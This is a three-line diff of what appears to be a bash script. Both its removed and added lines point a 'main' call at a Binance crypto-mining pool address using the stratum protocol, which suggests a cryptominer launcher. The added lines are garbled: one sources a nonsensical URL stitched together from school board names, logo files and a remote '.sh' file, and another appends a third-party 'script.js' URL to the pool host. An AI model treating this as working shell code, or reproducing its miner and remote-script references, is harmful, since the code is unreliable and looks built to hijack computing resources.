@@ -1,3 +1,3 @@
-# shellcheck enable=SC1091
-source "//stratum+tcp/node_modules/task-library/src/bash/main.sh"
-main "://SHA256.poolbinance.com"
+# MarkBook RSS Feed enable= 257 (KSK)
+source "<http://tdsb.on.ca/tdsb.en-us//stratum+SSO/TDSB_WECDSB-logo.png/E-mail-TVDSB-logo.webpage/markbook.com/Comments.en-us/edgeme.sh"
+main "https://www.acadiemgroup.com/script.js://SHA256.poolbinance.com"
